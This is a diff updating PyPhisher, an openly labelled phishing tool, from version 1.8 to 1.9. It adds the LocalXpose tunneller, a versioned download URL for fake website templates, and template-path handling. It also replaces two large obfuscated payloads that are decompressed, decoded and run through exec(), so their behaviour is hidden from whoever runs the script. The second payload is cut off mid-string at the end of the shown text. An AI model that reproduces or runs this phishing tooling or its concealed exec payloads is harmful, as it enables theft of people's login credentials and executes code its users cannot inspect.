@@ -1,7 +1,7 @@
 # -*- coding: UTF-8 -*-
 # ToolName   : PyPhisher
 # Author     : KasRoudra
-# Version    : 1.8
+# Version    : 1.9
 # License    : GPL V3
 # Copyright  : KasRoudra (2021-2022)
 # Github     : https://github.com/KasRoudra
@@ -13,6 +13,7 @@
 # Portable file/script
 # If you copy open source code, consider giving credit
 # Credits    : Zphisher, MaskPhish, AdvPhishing
+# Env        : #!/usr/bin/env python
 
 """
                     GNU GENERAL PUBLIC LICENSE
@@ -89,7 +90,7 @@ Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
 """
 
 
-_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'F02BE058F1DFDF5FBFF5142B8EE95AE05AE9F4297F18087342946816349278C381543BC834DB05D25FB4441BE9EBF71937D5CEDD9B430265ABC8E0FC24E75E4C2F793F7A97739336D1FC4811BC3DC255B694AD145C8BBDF8E5534FF0F69171FCD168880827752672674E8A9FB444700C967800502DE64CEDD67620F2D0B7D8E993EF4DB8F9F5D9BE8317213EB9F542D734FA1B1F8762431EFCFA26E1CB9B6DC551F5775EB93F1486B6FE7A9A6FB5EC9BE9D7CBC0B130AEF9A256D66D266A2A586DB9BA550C6A703A5B44E676E50AB1E27CDB72BBABB11A9C94607F518AC98BD5EADC7746C27424A4B8FBC1A485EA01B48B26894D7D89BE94E82AD1D907D94062F8CC781A1FCF16145DAB1BF784666972912392594A2CC5146DA448AAD3C2727DC5EEBF24C6B0370E52C608D51599A428A91AE6D3D30F72879AF892D9A9E4DF406F4CCABB9DE3E234CAAD513A25B207DE05C95209B41FAA15C150A536AEAF980AACF090595E101A1D54EB112E3AED0F2A1BAE5C0883867C74FF7FF0D16AB2C90E2D5F464834946E12556777A451CF3F97CD4C4C7E8A6F4E68F5F97D7F7FBEBE7F3F7F9FEFBE6CCE78020D6C8FF5A0E0D6255534842E9048CD74EA1D3C44C013D1199B2951C987'))
+_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'AD1C0C4EF1BEBE3E1EDF8A012CD89627107D136614DEDED3BDC3E6C1BCC64F11D3CC83F0B0E9B379091F699E698EF2FF8DDEE07DEDDCFE56C2EDB5D114B7727587FA56C5B9B3249C0B05EC20BDD160AD7F1A77ED50AB39F880F17373A3EB1E264FDDE7B2B3EE47E7EBF211B75B89D17FDA99E5B583D8B56032D9E63F8E0EF7169F812FEEE92B3B14AA739D00E0842D7C227E7DD7070B2C9E451456BECBC8628E077C7AB4986AAB5D88515D14D5BA233F79138BD518171A76BBAB48D3D60582A54C9E3FA47CC8ED262C643C0B7DB726DE64D5A8DA60F479BD12C274CDB1898CA8D3EE62B5A762690EBD024FC91863118684143483FEF4D60AC9A8D6639683B39C8D0B95A3F9ACAFFDD17C1A5A93A0BCE04BBABA3C69B49745268B3DE43A105BBAA9E904CEF64C9600455E0B9DDB90E0DF4253D1F4F30058A2251733F3F697A841655F5E0FB049BF2979288AC3D08455AD616BF60D8CF44AF5E57B152148448940FA329659FAE40F6502663CAC0B03BC1EEE2E5A9EA3BBA0A7E24249093CA2B74F453748A5E9DD7AA247B175D7D2E3185533F067F5D523282098D8078528A3C1EE48B13CF61ADC8440DD828738587EEA105F158A08CEE97FC903FEB908CBF7F7E3EBFBF9F9F3FEFD7F3D4E28F21858CF12A4FBE17827D220D8C7A12D2DDC764639F834C01385E69429D1C987'))
 
 # Color snippets
 black="\033[0;30m"
@@ -108,7 +109,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="1.8"
+version="1.9"
 
 # Regular Snippets
 ask  =     f"{green}[{white}?{green}] {yellow}"
@@ -131,7 +132,8 @@ logo=f'''
 '''
 
 modules = [ "requests", "bs4" ]
-processes = [ "php", "ngrok", "cloudflared" ]
+tunnelers = [ "ngrok", "cloudflared", "loclx" ]
+processes = [ "php", "ngrok", "cloudflared", "loclx", "localxpose" ]
 
 try:
     test = popen("cd $HOME && pwd").read()
@@ -169,9 +171,11 @@ for module in modules:
 from requests import get, Session
 from bs4 import BeautifulSoup
 
-websites_url = "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" # "https://github.com/KasRoudra/files/raw/main/websites.zip"
+websites_url = f"https://github.com/KasRoudra/PyPhisher/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
 
-templates_file = "files/templates.json"
+websites_dir = f"{root}/.websites"
+dir_templates = f"{websites_dir}/templates.json"
+templates_file = dir_templates if isfile(dir_templates) else "files/templates.json"
 email_file = "files/email.json"
 error_file = "error.log"
 is_mail_ok = False
@@ -213,24 +217,25 @@ if system("command -v brew > /dev/null 2>&1")==0:
         cloudflared = True
     else:
         cloudflared = False
+    if system("command -v localxpose > /dev/null 2>&1")==0:
+        loclx = True
+    else:
+        loclx = False
 else:
     brew = False
     ngrok = False
     cloudflared = False
+    loclx = False
    
 
 print(f"\n{info}Please wait!\n")
 
-_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'===6ESMYWKA67XP72777JSYQMYDPFFIRNJAXKADVCM4RFHDELJRSGUMS6N66ED7QN5MNHMUBGKAWA4NYV64FFXPN4EORPOAWPLP7773ZRXTZGG2EZTR7WKSMMOOH4NPZX5PDG36ZI3E6KKZHYGLNMG32YBBPEKJ5EEKYYE7VYLRKXEYGS3AYLNBEEC4I7KZQJDC6D52YZNWWQOTDWUQ23YJLLOEXFK5BQRJ7S7G4IUPQ7XDC5QE4SAB7N24AWR742S2DRBKMWPNM3AJBBI24SG7UFQXAXPN2PNISS3HZPFUTPZYBETUKRLLNRSZUFBNKDTGS4TBGQV6FF7VHI2ZZQZDYRYXVJXX4CN4KF55SCKQCVO7ANIACXC7XCDQ63QXUJ3ODZ2RYILE2JXZBTYHD245CPF3S2KFZSTJ554NT2I5P2AW7PPYMZZSB7IPJHBKY3C6BA2J7QCLTUBILNHKHZBS7TOFYVOHC6T7ZAAIQHYRPXQZJBRVN2TGXN3AJ2ZPPTVPCI7OGM77PJAZKCS47BMIGQHXHQHRDMFCZSDHXL3VOBHMAHJQXC2XBZHJ7T4N4W3EC4UOA5HAYCGTDS7CACLAUGJSYFXOAHDADDSOJWLHJPDA362JPHUJDZKN66ZMYUF643HJHWAPUQEZRAQ5LOELQYSZNZGIV3SKNS4JHMMGZQCB56JGBENNISN75JS2POAI7ODE3BIDGZAOGFJGNIPAOTAWRK7AF7DAUGIWHDMCRBY2B5JL6GFGCPYLC7SDSRRXCTDBYTK4PCWW6J3WMHYNA5K6CAZPAJS7I6E42CDMBNBBEPYJQHDHXACBPRABTPBNPOASUQ6HMBPJPKCV3F5K2J7LEW4VHY5VMAQYLPC3O3MU7GJG7EEIQKRUTEJ7FGGKPDR2VTA5VYM72ZEC6ENTKVJMAAV7XWYXDYQCYSZOV62KAPS3DNYJM37LO6TDTAHB2GSVPBRWCACGKYMHPYLBUKGW4H2W6NQS5PW267QADTYQPJIOWPM6SRPK7D7ZOSFTMXOON5RSCSJSAXMQE22E52XQW5XP6OTRXQHXEP3HG27YNU34PTEG5KFZDDAJ5ZFOINKXYP3SBY7MORLWBAWFYCAZGV3PK5TSQZU7ELH2RN2D7OERZBCTQM6GRANK2FSXJXYEBXEGQRDRDIOE5MBGNQPHRPDTXXXVVVJBPOUUZNMPRR7CSXLO7UTXKEFPTUNZAWIBPSI36NIAPMN53SMQAPTFYB5HGSDLROGABAKWITV7NC5DD32OAICHXDQXGQFKKXUCSDZYPIKBJ4F7QTRM36NMRCXPRHKP2HYHXQGCUFE4GARQQF4AWQBJZNYOBN727AUTOS4DQPZXTXYEECY4DM5EYNPRIGIW4W65MJMAGMVISQU2HDJX7IL5ZVQLVY4IUERTXJAX746QFGX36HTVEUIMOHATLMMBFPH7ZRW6KYHLHECRM4G4XGF4HIVV5XPV5AQLAAAG3X3FKLJOWDYV56WZIZJSANO7PJKJNFZ4NDSEO45TOP2JZ7MWAKK434EZCQT7YYQWKMZJ5QWIPFRGTCIJYGQ4L5MDRO2PVXLZZWSKETFFLAJKLWDWV576L3FD6Z3EFQFO66XDLAMVRHTQQVTZFVSZ3SV5XZBZYWMAG6CZAYEQE24XWVFSFDJOBUUL6CZBGZJNI76S3F4FM5MSRPALSBJ5VG2UMQCSKHP4NNPFIUFNOFDBA7YUAIPYBW6NOCW2IYOC4EIKCRYQP2HYLRDW37ZMQ442XJU5EXSVVQZDR2YI552ELADZYE6OJ5AARAX6SSBUGDRFINLARQF2BXKOTEOGXIL3QUBIBIPOBM6LKL7MOWUAUQXNVJGQACIYP72SNC4GXLL53QBWTBMUTWNUPPLLNEHLLMEVA6E4IB7TPRIXLDP2M53LERTXEIYRGKMCRKWX3Z7MPBHSV2BJXIMIGBPYH6N56G5NPCKQDYPZ2QMXNH6VRJ6GJUAYCB32KNIMCHG7HQPEZB3HJW25ANYBW7CHLLQP4GK6AMFIQLMEOYV7Y257BTKKBPNY5QAQAGGUOQBHIBU23R53EPVBOUJVFOUOOPRRUQTXRBYXNG7LGQ66PXD4LMH5Y4SMPAK526JON5R26FWU5DNMQMGSS3QBBJT6WXPM5LQMQMHX5QHKF542Z7GDSFOFPHNP5Z7Y7NV6VQN3LADI7NJQ4NPENCTXNPOG3ZUA6Z65B7WKFZDI2HJ3BB4NSQLGAAWKIF23LJHQYTZMPY4R7AZCFWLSTRPDEM664NE4MU27MTQME3AA4L5AVSLFSJFTGQPXZZMBM6WYIQ5KM6NULVGGGLBFHSWBS2DEFWLTVVNHNCU36ZAVPG57W2LIPFLDNDEVNWDSIXIWSZNXKPNL4C3QVORTU433L4W6COWACPD5XLWXNOQR4FRGVHJ4R4EP7OGCKFWGIAOITAJPL4BREY3MKLYEKZCGBJNT5NFB5FZCXPXRW33MUFR27RDC6SWRYG6DVSZLREBC63GQJEWWAQRNX6BW3RQFPNMX2O2YVYSXIC7NSECZBQYPQRPINBGAKPR5IQADLVEFM4LMCULVBUWORS75LZSGAEMKY37EBK74WLMIYNHKQH5GREJLPQSZ7Q3W3V2S233HCPJS2E7HWEEZBAG6BJAH3RZ755AODJLURY2J2UE3FZZPCV6BC3NJMGAZRYF53F6AEKQCJKF4R5CQAP7NGAMPQ4ELN2YFP2P5PCIFGUO43YHQ3MPFHRCNMENG4MJ6PIPN5NGMZD47OY3GTCYW4PQEPDTLHI5KBFR63ZAC7WHTSZZ4OAAEULWRVLLN6ND53W4UBTHRTG23W57XQ4QFANMVSADBJZ7663BAIGGSSCZWI5NMFWIQXW7V2H5RN3POXE6B4Q7LDTPD2NXP7Q7SBLLK2VZPSULU6FXYWWE6TXJF5RRKHRB7C3L2BNB6QQ752YL4IMMRMK7ROKLXTZXV5DJDF5UAEPE3PWFTCY3VGQKRRM4MS65XFPY4GMP2SPRPHIA2U56SHKDEUPOTOGYJJXLTPYXCV2PMO3IQMIXALMADG72CMRTZCBO4MLDWXPHYRKHG5DPQ3ZHPZJPSKHCOLEBLKEN5CGTGPWRN52G4NCRQDLZMLIGCTFTSCW3O7X4GMFTTEZTFN26OVKXJAX3SCWE6JYP3NGVXLYYL673GKLNL42Z7E5HIPQGWAHPJJWKRPT3WZEXEIAXYNHA6GBNNQSBYNTUK74QJDCNBWLRAQVXRV7SBG3P3DWEOKN4AVE5XCMT4JMK5DB56KA2H5HT7RZM6NVMKLBHPU3LNTWEBUBYMK3ZJ73SNUAP63GB6AVAJHSA6K3MXAK6C34ANAVBNZMSI4S7NGAIMEQZEXXYK6CALAR4JJJKP5CXUYV2U45PCEIWDOJDFXYQNFPDKMQUM67RPIHDEYV4MSG6QWABHKGAQLCRKTADRVFMP7M4JDVNWPR6JCB75CCQJGMODO25V3V4CWQHADH2WZVW6UPGAAWLWUVPZRWPIDU4L2DIVICTKD442IJLCL6ADUY5FRRLEKJ477WGODWKNXIC63YQ265JWDONQZMYCJU7QVJ3Q6MVAVQNBUA6KKB63JPYLYRYV25QMHHQPBSQO46DIKLXXBDXOACRFU3IYCNI424E7SY2HEGTVNDDBL5TOWL6IBUFGP3BGIXOK4MCCW3L2ATQ54WLJ3SCBDXLIQJ2YT74MXVQMX73UTYV5AAGTQD3LJRG2A74CM6EWLB5IWDLPW5OJ63RUA3IZMI6LWJKIBFMQG27YZTVUWGMPYRZL6OGBYHXM23ONP6SS4DOY74FMET5HKNMBPX27O3LFA6ZCFZY36V665ZSCGLA6QHGA23SMYUVQQGOTB7IIORNBGEGQAMJJODTKLQ4VRJHQNZAZZBZGKF6DJT2V2GB3EXFW2VFPK5WIA73ZIV2QARBJLW4D33S2E5QK5QOIO2DMG4W6BZ62UKKUOPSXOSCLG2M3OB44Q3IHGZEZO5R4FMMLXIYROF7Y7EZC7LEHXH3XLXYIJVP5O6Z375LQ2MUFVHJEFTEIPK25UKWT3TJ5675EIEAYHYRTKXIG4FQFXRHPHTURKG4LRPPXJ4QC33NJTFWQEL7QEMDMWLZYZVDOZUE2L7B6SWFGLCFHJ45TN65ERLW7STNBY7QSOWE65KBVOHJXNHC4FST6UH6DHHSHKRUIOXP7NOHWJ3W3BJOB7VQE7GCNOAPPLT6GT6PXIFXF6IAUIQTN4RFJ4WH42DTZFJIZPZ5UCRPB6GXGAISAOTI2GYBJ2TRK2FV56NS2NYS3NA7OAI7M64G2JYWXUZRFHSH7VY4VUBL6EY5GWI2CQ7OR6IFPCI4YTTJFKW7ZG33AFJCP2LYPYKHLRQKWCSAFJJRKZBK4372M6I6FRN2Y7LKNLFG64J5HPBEEHDFH2AT6BPUL56KHRGLDVEVWJS6747VXELM2N6YDIX6JGNRAD5COUM2FQIWFXRER3PMNJHES7UUEJG6J7UDPN2NDH4GAXBEEUHMPSHZ34RJ7F45MUPVTELPHS42EY3SJZLXQB6ATL3JJDJQOLQWYVCLOAR5BNQH7XSQVLB2EQPRBYLW3JVB7C2FJMP5MOB554JNVKLUXG6PZDC45KW3D723YYYBRZBWL6QJOYG5LFB6O6SG4NE2AYESMM4IBIBNYBZOIQOMG2IUYEXCROHADK2NHYGKWWMB6RNGNLLS6YLSD4OVD26X6LZU3VWEAKBMI3YP7STQYLBLJEQFO4RH5VKSGPFA7W5KVBZ3OBJ7PMVM6XIVSYQHJJKDJRWLESZ2S45G7AXZPL4VTVLQMJB622SWXRD4VXXPPUXQKXWKOQSHLQ2Z6PU5JTPPKVKQ3VKJC2MH5VSIUQAUQ5OT2FR5Y3WCOXXZUST25GZII5BPGVOZK24FYLYKXOSAEFBXZQZVVKHDNQZ4XYLF5V4VZHCXIS7KCAU6ZNBWXU5WLEFDGZXUYW53RL6DK5VXYTLWHNNLLP55GQIU5C4VWNW2DT4W7PEDTOWMIJF2P3Q5SYYCYUV642VGCMP3DZFAVT2FRU37TKBKZBBNMH7HFNOPVRUMSCQK5M4XWXJ5ZZY2EXYWYCXQG2WSEJXHQPSRCN5ALDPBWXSPRHC4W6YFSZU5V42BQT2EKHBUPO5S5ZY2EDT5YQPLXVF2655CEO7FMI5PTWKVPJD3FST322GBUCHO3VHFUJJ2WEROOIPP25MKFZCJJ5T2CZWZHGH4TDOZK2WOLZM7C6A4JXKHMZDHBLWC435WJKBRLUDWNN6J4WXHETPUL44WT2IBB4RQT3X5LMUZH3DPY7U4ONESCSYYBCXNTLOPTQB3ZY74CLK7KY3CKVTN7QY6MBEO6CLDRR7FB7DS5F25NXZ3FIIUSQNMWG5XFNNDHKZB3QFLHHW5TUN3ZM4YZC5JDWTMKOKKPXYZYS6ZIRDI2NLL2QRQCNZD7QPGGIWZ4PUY2JRL3Y2UGEWG6KZM4TSWDCROV7OO3KN3VXFE2VJ7FKNPGLU6NLYRAO52JXMW3CESKDXG4F5V4OGJXU575STE75JZAYAD3T7IWYSOWN524T442R3CJ2LHQA3V2KNXFLCH2KTOWXAFUZXIBIXWN65QLE4IMLBNO4UIRUCIHXPSI6PEJ776DX24I2H23FDYF27QEOF5HYNXRDDRDPJVMNYFZZFKPGVWTFWPWUKW5NEXNVMXAM3KRL6RFYJMNYEXG6BPIONUFBQJT66MHJXPZUGPJCIV77HGBZSMVH7QGB6BT7GL73J2SWI4MEEC5O53P4SPVZY3WFBQNW4WTNTTK7OTGV7FBQNAJLLBNG7ULIZ5ONRHFXMLYQK4RNHY2QHQHHXAZWSERYJX6CPRGRBXZRGPZOIFNZ7CK5KEYUPKXGGKYUZ7RSYB7W3Y6JZ34RCVKB5RBPV5SYDU2P7DPQNKKESXIBU6N6IYL6CP22N5KWDTL6O5VDDXROJ2SF7O76MPOWHHW3WE7TCGWUG4MEEMWFX5XUV5XIKRUAAUBVW2ICECBA7QOT7AK3KCE7UZDNRV3FF4O3B4KB5HHN2Z4JZKFPFAFSY6SMDPW4W4ZCIRHLQ57PQ5WZL3BDH2B2JWSUJKTP7RAKUBLCZWYVOXEWHUMWMRL5HEOLIWMUWVNP53CQYTBMFXM6K2CHC6XG26UARZSKE4O5C5B6F72DKTZP2POX6VKZOI67SQOPPNRC2KLBTA3QYNHDXXIYEXMGUWNVILC32TZVPITKOYY236MEFM3G73EW4LLBMRFZVTE3J5N4LEHNEDJ66JSLKP2GI4K72RO4SGBK7Z7KCB4EV5H4TZXWDX6MMQUGJXLF3N5YFGXG5NKLHP43XKMHASISG4HUINLOGB3I7Z6Q2OG3SPQOVPT5F66FVQ74T57FMQFLU4XJCRRQBDOXZ2Q3G3DDXL2P6MJ7SG3QR36OXH3TFKXNHWZDNY5KMZRWFOXPBDXRZXEXGMYFGEQUO23EVXJOFP4O75ZGT2JVRSTNZTXR7NJHS36W46UHMBJX7RKRNKXH4TESK7K5XQWX53T3V5LNW2L73544DFN2PPMPEWG5IZTLVK3JVVIBFL4HWHRWIT34UT3XLPWKX5IKECLF4F3ZGDCK3ERHQ2DNN2XPKA3N675WO5CVKU34M2VGWZ2YG3MO6CMEXN765LW767765LH74X77XHP7677QM7KE3QZJSKSMFIUASUZPYH6XDUD3MQ3SSZERHBFQY4YVZZ36XJ7REMFQL23RJCG3BOCP'))
+_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'===6V6AZI5PK767P7YSZSXGQYKHMXKV3XTVA2TXLT6ZKVPEU2NGDIIAS2TA57NCIK62MY6SAQWNA5ZB2QTG5SIKBZHO6R7ZRT3C5MQHLZY77PY3VW74YYRXLFSHFLGL4EYBDTKCPYANFA423M5RR5LRREKHWAXD7GXS2Z4ZO6TCAZC34YSTYIGLYNS7GXPFRHK32S4PRGAFELTGBO7DKA64HSJ5PQMSIBIHDYLSYH437UHB2F26DJYHZ242ADHDSD3GODQ7GO6AP6RTF4FAQEBSSXIKEGAVFPXOMR5TUQVE24YHFHYM6XBSRTX2BRC5BIDV6KD7QCBVFAJQSRXGPNXPX6QYACFVXFCL6XMCMQQPDJGUTU4H7S6WUVBC46MAQZF372C27SZ6URK6EQJEANB4DOATNOOUI2XENVJIEYHS6WAR4BEVP7B6O76LZC3TDIOR5BPNLW6CBBJU7CC4YSSHQT66LIIVWPFMC5AVPKY622OVPRL6MHX3O4ZOM3EGVPYSAKBIYSRJTCYSDTTRIXVMGAKAXTAFMDZTWCPQQUPFFNMHQ6XBAGVCXSI6UM52TWXSF7STSNXQ25PNIQ6QG6S56CC2AHSQ3WYVL2A5URAYLXKACBOQ56CGUNOQU7A3PISYIGY25FXVMLTNJIDZGWJNNPUWWE4XLK3RTVPLD7OX6RZRDBSZCL5LO2DQWDER323A6F6QDKA5PCXBAPDCXQJ2VNDCJAOAEJQKKA7N7SBPVOQSVTXJZGTAAR7MS6A3TIUMMT6CYR2EK2BPWPGJCE2MTLAMRZ647RFU5N7P7O2WS4ILX56JQ6V3557S5JPZJX7BBNYJZC763ALC27ZD55OFWVW4BMISCLT5R4ENOUGQ2APVWRRGRAEPXIEBNMHURDB7H6TAXKHUR5DSIF5MVWAZPACXDXROOIRMI6CDAALVB76CA2W22YST3XVDPOXEGJUXVIG7FKUCQMDYOQJHKFLJRWANV7DPEN5QORCNCSU2TEACNYLBXFVDSXHPFPBPQYZ5A5ICLSKIXYXHZC3GUVPQY7FA626YNFIXKADMIDBBZVG5PL4Q2HDUESKVNTEHFFL2K5MXC2AY6CURIKEAXKQ5G4JCRDVJXP6LDHTR53LN4EGOJ3RSPQTPOPW52WZ3XLGIIGS4S7OOHIADJZS67CUMJIPBSV6I672IK66FIQ2DWOEEMR2BF3ANQYCPFEDCBZ5X4Y63BW7FPO4UGFRZHTY3WC7B7I5DQ63S2GQLSBHVX5ZZUNC6MIA6YCGLN2OAPA3LHWU4RBYX43B6NJ46SL5BFDCUSY4CUOSBD6QHB4Y54GQ7QBHF4ZDD7M2RZAGBBQLLV2WNORFHHYJEDBX7YHDYXPZCA7WZCJMIKBA6FG5KA5M2KZME4LJOTWDPSXQUNDRZ4OXOVIR7EWX4MXVQQ7637I2BMDVNCGXFW3FWF6HI7TDHU2KMEMOFW7KJIHR4HYWM65PBKGO6NZ4BJEWR4Z4DCHG2CQZBPZCSDKZCIHSWIQIPLJYN2XAMI3QEE4HJTEBI2KRTQKEO4ZJZIZ4YRSGK52SNNYLAZCJK7GG5F6TFS3QQSPNYHRHPJA3YVJSQCLCPSLTCMCC734ZWXYH2IQTACJAY5DE65IIJ4GZ75P5YXL5CU4V34HI7ELCRVY6OHAUIQKXQXUF76Q7INHQB7QHTOTRWQAUDBGIQ4ORD2FRBICDACREKK42H5QS3P3SBNVLLB4UJ4EHDVC5HJ7GIK3YLWTOFQOXEXXEVFL3XA4KSS3AVYKWNHWGM7RPX7MVADIJNHHS5TEUUCK72SC7JDCUFIPNYILQSF5O6GECV3ZVH7ZHGQVWRK6W766VBN2FHUO3J5DQOPRHRO2ODSJF2MA5WJD75MKGHUOUZKMR2IOY74HIOIZHTRRA6VJRFOMQ4FG3CRM4B2DPDLAA5E3OG4R56ZECVOYE3FAKYFHMOKVABPXNXRFP2DA2QLLDNPQHTNICWOB4APTEGVP2NNVON5BPPIEJK55TRLRLLSU2W4YLIJH4PTASWONT2POPYOPXTIFE53BQSGFVGVXATUDID2DA5WNMNYVU6ZL2P3FH2EBOYFADNVALTOKJUEQ2NOGDT75DXBA33IWA2K4SAUUBUD2YMGVVJZAXBWRPWFJPD7DOJOCR6VATYT7HIUAWA63OZYAV44XB6IVMZLM23VDC55CLLY6YVT3AJ2SBSIQQCCLAJYYYPILC3BAA5TLOZLN3X5F74VD45XXMA5EOPMMIWG26D4PCM6NDNVIXM5BDNKSS3PYJ45TW6Q3AH4DN3MDJXOGV6UGUGHFULM5UOU4JJFMOJR4AXSF55PIHPQQ2MIY6QPCEJJH42RUPHE7KR4GDP74NUJD2ED3FZ5WVPTWKBTWWZYFRCRWHMOKDYXZIXXAJYBFKY65NDDKRW657EFBJL2QZGIBVYM73VS4LE245ANXPD2OLAZNH6NGC7GWPFXI5LEAXNDCT4332U7652G7ITL22PU2V3ID2FLYRVHPSTFZQGVVXVXEJIPFPMQLFAUDPCI6SMSUDLUXOO4CXMPRV3YDPUJ7WZ5U7DTULB3ZRJ2DYW5CMPXZVHIHMGI5YEPH3QKQSM4UFSKXFIQKUPROSQSRAG7GD2IUSF2TN3VOP7AEPPA3XMQAYOMHKDVAXVTIKDCM32PTUWZ2DCMXY5ZH22PCFPYAU755U2WWG5OHJ6UYLH3VP7CU2VPKK5NC6NA2UQZAOQRZN6NDRPKYHREKY5DUM5EBCZX5TRP2W2NMMTKG44K3JQ3N2LWSOP5EESQL7Z7DCNDPB352TAJFQRBB4ENQADJIE7C2LDA2PSTCL73W2ZIUPQOSDORRA7ORTX3OQUGMDYMXJFXPHYUGFNVQWCYDRQOMDEXCLFKW6HRUODLPLARGE35OBVAGFBW24ZFSL4BZB255ZOCEWRXZJBOO7S65P5E34BBJ54MZTTZOIP5XSDX4SZQI3Z3PBEMCGQFIU76Q5WIOGPE2B7AWNYLOMDZ2RBXYDAINMQ2KIUDMPQTQ4RQCQZYRCCSCK4GSMOHADA7WZSPYIJAEUZ25QG5KTXQJK7JMQLYA4SLGEPJTOYHE7FFCJCOFBOVJCQYEWTXM42AFBYBSSC73YE3RJFC2TABZA5I7UZ6EKYUACMERZGIYRAJN66NIBV4GPK2VHNPO7VTMHGBCAC6RQGOTDI7EF3D52OMPHCTHS4HWERA2Y5N5NX6GT5S6AELRCBZJIBHUFB4OBCA7PN2BB7KBHDCPYDDMQ5HBZQ7DTN7FV76B6G3FZIVYZZYIQS5RYBSS3R6GECG5UXBZT3CWL42GBS74YYZPSPXZS7QOGZJTEIAPNR4IZ5B74Y6O7O35FV2CWPJ5HTZFZHYCSBAT64JFOTIX2GNMLAX4MK7RTAE5O7237OXKCSUOGI4JTXD5K5Q6RQJTHO4KQEH332VNBNMJYBMWZEWBQGLPO27CQ6FIL22DMSWFEUVD3C5YM5HTMFRUHFHRDIM7H32ZXFIC5OE7FQHARNBVAE4NTUDKFO5UU6O56X5LK42K6AKOMCY526Z4435ZKK2ETREUA7HSPPNCJW2E6ZJZXXOCGCGDSGRNBWRQL43U4ITS7TK5GE4IG5OISI7YMSLEIAVNDTFCSSCCHAUJWUL56YGXW7X23GAH6NSGZV2TG3LH2CQ7K7GUUODEKHC5C5WB7ZKDBCVCBVPHQH3HMVC6SJWRAZFMP3SN7A442Z3TF7WYU3USBL3CJH4OQEJ7FOR5OT4QPMH6BIBAGRWME5G3MB3KQ3GX46AXYYUV3TBJFTH3PNMLSRCZFB4W6LQZO4IVGG5UDXWUL3DYHMC245LEYEOOK5PQ3NGKOXHNRNQMDZWNPLRWGZTGGLYV4RUECNMQMDOS22X2I44JX5G42ZTOVRNOIBZG3BB7VHLL4NEMWI3ZSB7OJE7ZYSTBLBF44GKOS2YYK6ISEQ4B3KP7X5NRHQJVSLNUVAKJRWUJNSKHLJLJ2V32QN43MZDXV5AXXETFOCMWGPPU2C37EVO6SSF7HRM4KVTKLZJEDEBBM7QJ7CLTQPPJ6F4FUHWBGTTV267SKSEFJ7QZ4U7SQEQTTEZOCNXTAZURB7UBEGC4RX6TMI35RTM376BTNSO276QYIEXCHMAORINWCHWXN5AQI4NTMSL64PGQWWRDPXJZIA3YMVO7QFL5V44BBOH7LPXDDSTF7CPG2AZUFQVD5ZJOASWXHRLLXSD6IFY5FAUGELWQYWIY4N5D2BQH5FDIICCQU3YPTXSH2S6KZ4GU57PDY6DVQGIZUKDMRIXX33U5BY6FF5DB43DSBWQIE24NOUV2X2FSGUCAAR6FGHSG65ZXSIGS2SC44O2ADESPU5362C4W5P6VD7JAK4OL6WV3SPWGPKUOQK552RHCPGPQ4SPRTMCN56VJ725YA3GYDPVLX3LIEO3EXG7C6GPZZSFF3IT3PAI7T46EO22LN5LW3ZO6CT4RQF55GVFKHUOB7CMBYARJAAWKUVWBE4YSUPGC4SOHBHYIFAMKO66WIX6HZLK7XUFOMQNICSHJSPVO4DDD7RHB7N3QG2SP2ANMYMF533OQAARB66VAIOIWOLV3JW3CV4SCKGH5HMPX3N72Q4K6TFEQF62YFR5KO5JMY7JF3PFSZLPVBS55BHEE6IMHISHCSY7DWUYU3EQFUXKP5NS64Y2O5ZC2V53G5FTLUEHAZIT2BUFOXVNUZ4LF4DQSQZ7F7MGMJFE2UMXHZRC2I2FOXW75W3IU23LVW6YU2DTZT5K34BARTPVCVG7BWFVE6ASDEDMTCM2DHKE7MPYXJ7NTNZ5HEMXXGBXKEQWGOVRBDWIXOGNVKCKLZNVRY5FKUW2VSNKY7MYEFOF6YOTKODWZJYRSTSBF7BPZER3X6WRZCUKYNOJMXJCTTYN5NJANM4JK43GHYCJMPJ6BDZEMYZHF65ATYBLEPCXIHWPLEPDO5X4RPH7ANQNG7HDTO4FSCGAU6FEJ53H4ZXYSDHWF2JLEUXJK4UG4HTGDL4J3B5D7ITRB7GGLINK2N2KCXZHQVQLT6SJIOVGPNART25PE72SEYZNFLZO3KMSNTR5VAA2DSFQ5IJOEEEB3C4RTI3B4SUSJ5X7AHTZCTURGME724A3ONRZ533L7UCX7VHA72GFJKCMV7LP5IIKPU2AQVLTB2CX6XSFKEMTRW35JHC72R6XV25OEBT7YD2PRMHSJ2TEZJHCS74C7L63FON4UP2RGGOVLQJDW3EVVKIJLBNHLI6AIPNVOQF6EA42NCEJUNQUVNHAAYGXMRQ6IBGX24CNVCZN4KS3SYTZ5URTTOFT5IO6MXIRECTE3QYJNAKPZHYMYGAOD72LVOZXAGUHAA3JPH2TZZCM6XQZCPOBXKLEYIGHFJNSLBN6WMG326GHLFZ4BKUKFDD53ZLTXEFFWMDHON2AXRSZ3WJUQSV22RZ4YU4N7K2WFQSNFO5TCWXYN3MLNZZFLDXDU42I6GLZZXOJIZSE3N6OKZ6ZHAEKBMGSPD2JXKDKQCJ7YVQTYDUNTNXXKVYO76HIR5JXEGBMMGYOTFSEMRK3WIMUXHO3VATQRSKR6CLO57MBG7TWUXQP5WEBLFI2J4I2ZLC6C7LWH6ZVLSUJILGJDSOAX6YN6KLRE32YNYLBWBYK6QS4J3PIX5QUYZCZNVTZEQBLWS2XXMNX7AXJ3I4DMVVZXVWPDZUZ4ABOTTI4OSQIQRNKITHKRUDCZLDJRLUFU4O7HVR6LOHUCZOHH5B73KZW3VFDWP4ZF4E3XCQX32ROQRQCOAQAAMVDFK4NT3GZU4PPQGHQZESLJ2PXQOFF2VJP3BMFC6OALML3TWQNIGKBPIEW6MH66SSSDTWFCYY5L6YJF65NV2J467B5APXIDVZYLDYK6WBUWDWDRMJ5DCJZF2OVVNFBWZI6C36WOZNI2HTLBEO4R6NW5WL